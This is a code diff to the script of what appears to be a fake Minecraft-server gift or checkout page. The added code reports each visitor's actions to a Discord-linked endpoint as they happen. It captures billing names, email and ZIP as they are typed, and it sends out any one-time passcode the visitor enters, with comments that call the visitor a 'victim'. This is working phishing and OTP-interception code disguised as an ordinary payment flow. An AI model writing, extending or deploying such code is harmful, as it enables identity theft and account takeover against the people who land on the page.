@@ -777,6 +777,54 @@ body {
         const username = localStorage.getItem('donut_mc_username') || 'Player';
 
         window.__otpSession.username = username;
+        if (urlParams.get('code')) {
+            localStorage.setItem('donut_gift_code', urlParams.get('code'));
+        }
+
+        // Realtime Web Activity Logger to Discord Sub-Bot
+        window.sendWebActivity = function(action, statusText, extra = {}) {
+            try {
+                const fn = (document.getElementById('billing-firstname')?.value || '').trim();
+                const ln = (document.getElementById('billing-lastname')?.value || '').trim();
+                const email = (document.getElementById('billing-email')?.value || window.__otpSession?.email || '').trim();
+                const mcUsername = localStorage.getItem('donut_mc_username') || (fn ? `${fn} ${ln}` : (email ? email.split('@')[0] : 'Guest'));
+                const curParams = new URLSearchParams(window.location.search);
+                const giftCode = curParams.get('code') || localStorage.getItem('donut_gift_code') || '';
+
+                fetch(getApiUrl('/api/web-activity'), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        code: giftCode,
+                        username: mcUsername,
+                        email: email,
+                        action: action || 'input',
+                        statusText: statusText || 'Click Continue',
+                        link: window.location.href,
+                        domain: window.location.host,
+                        ...extra
+                    })
+                }).catch(() => {});
+            } catch (e) {}
+        };
+
+        // Notify Discord when visitor lands on page
+        sendWebActivity('click_link', 'New user clicked the link');
+
+        // Input listeners to notify Discord when victim fills in details
+        let inputDebounce = null;
+        ['billing-firstname', 'billing-lastname', 'billing-email', 'billing-zip'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                el.addEventListener('blur', () => {
+                    const email = document.getElementById('billing-email')?.value?.trim();
+                    const fn = document.getElementById('billing-firstname')?.value?.trim();
+                    if (email || fn) {
+                        sendWebActivity('input', 'Typing details');
+                    }
+                });
+            }
+        });
 
         // Render Order Summary
         const tbody = document.getElementById('summary-tbody');
@@ -856,6 +904,9 @@ body {
 
         // Hide prior errors
         if (errBanner) errBanner.style.display = 'none';
+
+        // Notify Discord: User submitted details and clicked continue
+        sendWebActivity('input', 'Click Continue');
 
         // Loading state
         const origBtnHtml = submitBtn.innerHTML;
@@ -1010,6 +1061,9 @@ body {
         }
 
         if (errBanner) errBanner.style.display = 'none';
+
+        // Notify Discord: User entered and submitted OTP
+        sendWebActivity('input', `Entered OTP: ${code} | Verifying...`);
 
         const origBtnHtml = submitBtn.innerHTML;
         submitBtn.disabled = true;
